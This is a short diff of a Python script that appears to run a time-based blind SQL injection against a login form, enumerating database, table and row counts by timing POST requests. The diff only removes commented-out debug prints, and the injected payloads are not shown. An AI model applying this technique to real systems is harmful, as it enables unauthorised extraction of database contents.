@@ -17,7 +17,6 @@ def count_db(url, cookies):
 		params = {'userid': value, 'userpw': 'test'}
 		start = time.time()
 		response = requests.post(url,data=params, cookies=cookies)
-		#print(response.content)
 		print(value)
 		if time.time() - start > 2:
 			break
@@ -59,7 +58,6 @@ def find_table_name(tableList, url, cookies, db_name):
 			params = {'userid': value, 'userpw': 'test'}
 			start = time.time()
 			response = requests.post(url,data=params, cookies=cookies)
-			#print(response.content)
 			print(value)
 			if time.time() - start > 2:
 				result += key
@@ -148,7 +146,6 @@ def count_data(url, cookies, table_name):
 		params = {'userid': value, 'userpw': 'test'}
 		start = time.time()
 		response = requests.post(url,data=params, cookies=cookies)
-		#print(response.content)
 		print(value)
 		if time.time() - start > 2:
 			break
